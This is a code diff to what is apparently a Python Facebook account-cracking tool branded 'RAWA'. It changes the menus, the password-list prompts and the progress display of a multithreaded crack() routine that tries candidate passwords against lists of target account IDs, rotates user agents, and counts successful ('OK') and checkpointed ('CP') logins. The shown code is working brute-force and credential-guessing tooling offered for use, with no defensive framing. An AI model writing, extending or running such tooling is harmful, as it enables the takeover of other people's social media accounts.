@@ -152,7 +152,7 @@ def banner():
 
 """)
 os.system('clear')
-os.system('espeak -a 300 " Welcome,   to,  RAA,  NEW,  UPDATE"')
+os.system('espeak -a 300 " Welcome,   to,  RAWA,  NEW,  UPDATE"')
 os.system('clear')
 
 def menu():
@@ -199,32 +199,37 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
+		print('Error SELECT')
 		exit()
-	clear()
-	banner()
-	method.append('mobile')
-	clear()
-	banner()
-	print('')
-	print('')
-	pwplus=input(f' \x1b[38;5;98m𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 [ Y/n ] = ')
-	print('')
+	print("-"*30)
+	print(f' \33[1;97m[ 1 ] P.FACEBOOK.COM')
+	hc = input(' SELECT  ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	else:
+		method.append('mobile')
+	print("-"*30)
+	pwplus=input(' \33[1;97m[ 1 ] AUTO PASS\n [ 2 ] SELECT PASS\n SELECT  ')
+	print('----------------------')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		pwku=input(f' \x1b[38;5;98m𝐀𝐔𝐓𝐎 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 [ Y/n ] = ')
-		print('')
+		print(f'ExSample : qwerty,qwerty2,qwerty3')
+		pwku=input('ADD Your Password => ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
 	passwrd()
-# Method Main
+	exit()
+def write(string,slp=0.02):
+	for i in string+"\n":
+		sys.stdout.write(i)
+		sys.stdout.flush()
+		time.sleep(slp)
 def passwrd():
-	os.system('clear')
 	banner()
-	print("")
-	print("")
+	print('⊂⊃⊂⊃⊂⊃⊂⊃⊂⊃⊂⊃🦅⊂⊃⊂⊃⊂⊃⊂⊃⊂⊃⊂⊃')
 	with tred(max_workers=50) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -285,7 +290,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r \033[1;37m𝐑𝐀𝐖𝐀 🔥 {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
+	sys.stdout.write(f"\r \033[1;37mRaWa-𝑻𝒆𝒔𝒕🦅 1 ]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
